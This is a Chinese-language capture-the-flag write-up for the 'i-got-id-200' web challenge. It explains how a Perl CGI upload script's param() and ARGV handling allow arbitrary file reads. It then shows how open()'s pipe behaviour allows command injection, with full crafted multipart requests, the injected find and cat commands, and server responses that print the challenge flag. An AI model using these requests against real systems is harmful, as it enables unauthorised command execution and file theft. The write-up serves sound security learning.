xmax-web-i-got-id-200

打开网站，发现Files选项进去以后可以上传文件，submit按钮作用是将上传的文件内容显示在下面

点击Hello World栏会提示`Hello World from Perl!`看出使用**perl**语言写的

根据perl的语法猜测这个文件上传是这样写的

```per
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    while (<$file>) {
        print "$_";
        print "<br />";
    }
}
```

**漏洞在param()**

`my $file = $cgi->param('file');`

> param() returns a **LIST of ALL** the parameter values but **only** **the first value is inserted into $file**

`while (<$file>)`

>“`<>`” doesn’t work with strings unless the string is **“ARGV”**, so it loops through the ARG values and inserting each one to an `open()` call
>**=> We can read content of any file by assign the scalar value first, so $file will be assigned our scalar value instead of the uploaded file descriptor**

param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。

注意ARGV是PERL默认用来接收参数的数组,不管脚本里有没有把它写出来,它始终是存在的。



> 所以可以通过上传多个文件，第一个文件内容是`ARGV`，并在url上附上参数来达到这个目的。

单独上传一次文件，burpsuit截取的包是这样的

>POST /cgi-bin/file.pl HTTP/1.1
>Host: 111.198.29.45:43313
>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
>Referer: http://111.198.29.45:43313/cgi-bin/file.pl
>Content-Type: multipart/form-data; boundary=---------------------------13271546801723549018281431143
>Content-Length: 347
>Connection: close
>Cookie: PHPSESSID=rj6tgg529u9r3ei026pemdf425
>Upgrade-Insecure-Requests: 1
>
>-----------------------------13271546801723549018281431143
>Content-Disposition: form-data; name="file"; filename="1.py"
>Content-Type: text/x-python-script
>
>123
>
>-----------------------------13271546801723549018281431143
>Content-Disposition: form-data; name="Submit!"
>
>Submit!
>-----------------------------13271546801723549018281431143--

要一起上传2个文件，且第一个文件的内容是ARGV的话，只要把与file有关的头和分隔复制一下即可

```txt
-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="file"; 
Content-Type: text/x-python-script

ARGV
-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="file"; filename="1.py"
Content-Type: text/x-python-script

123

-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------13271546801723549018281431143--
```



**open() in Perl**

> Let me talk about **Perl’s open()** function. This function can also execute commands, because it is used to open pipes. In this case, you can use | as a delimiter, because Perl looks for | to indicate that open() is opening a pipe. An attacker can hijack an open() call which otherwise would not even execute a command by adding a | to his query.



构造查找flag位置的请求头：

```txt
POST /cgi-bin/file.pl?find%20/%20-iname%20flag%20%23| HTTP/1.1
Host: 111.198.29.45:43313
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://111.198.29.45:43313/cgi-bin/file.pl
Content-Type: multipart/form-data; boundary=---------------------------13271546801723549018281431143
Content-Length: 498
Connection: close
Cookie: PHPSESSID=rj6tgg529u9r3ei026pemdf425
Upgrade-Insecure-Requests: 1

-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="file"; 
Content-Type: text/x-python-script

ARGV
-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="file"; filename="1.py"
Content-Type: text/x-python-script

123

-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------13271546801723549018281431143--
```

响应：

```txt
HTTP/1.1 200 OK
Date: Sat, 03 Aug 2019 04:52:10 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 562

<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
	<head>
		<title>Perl File Upload</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	</head>
	<body>
		<h1>Perl File Upload</h1>
		<form method="post" enctype="multipart/form-data">
			File: <input type="file" name="file" />
			<input type="submit" name="Submit!" value="Submit!" />
		</form>
		<hr />
/flag
<br /></body></html>
```

即flag文件在`/flag`里

构造查看flag的请求头：

```txt
POST /cgi-bin/file.pl?cat%20/%20/flag%20%23| HTTP/1.1
Host: 111.198.29.45:43313
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://111.198.29.45:43313/cgi-bin/file.pl
Content-Type: multipart/form-data; boundary=---------------------------13271546801723549018281431143
Content-Length: 498
Connection: close
Cookie: PHPSESSID=rj6tgg529u9r3ei026pemdf425
Upgrade-Insecure-Requests: 1

-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="file"; 
Content-Type: text/x-python-script

ARGV
-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="file"; filename="1.py"
Content-Type: text/x-python-script

123

-----------------------------13271546801723549018281431143
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------13271546801723549018281431143--
```

响应：

```txt
HTTP/1.1 200 OK
Date: Sat, 03 Aug 2019 04:53:39 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 601

<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
	<head>
		<title>Perl File Upload</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	</head>
	<body>
		<h1>Perl File Upload</h1>
		<form method="post" enctype="multipart/form-data">
			File: <input type="file" name="file" />
			<input type="submit" name="Submit!" value="Submit!" />
		</form>
		<hr />
cyberpeace{edaa0b9311a29dd3bfbf176adcb61e53}
<br /></body></html>
```

p.s `%23`为`#`的url编码

https://gist.github.com/kentfredric/8f6ed343f4a16a34b08a
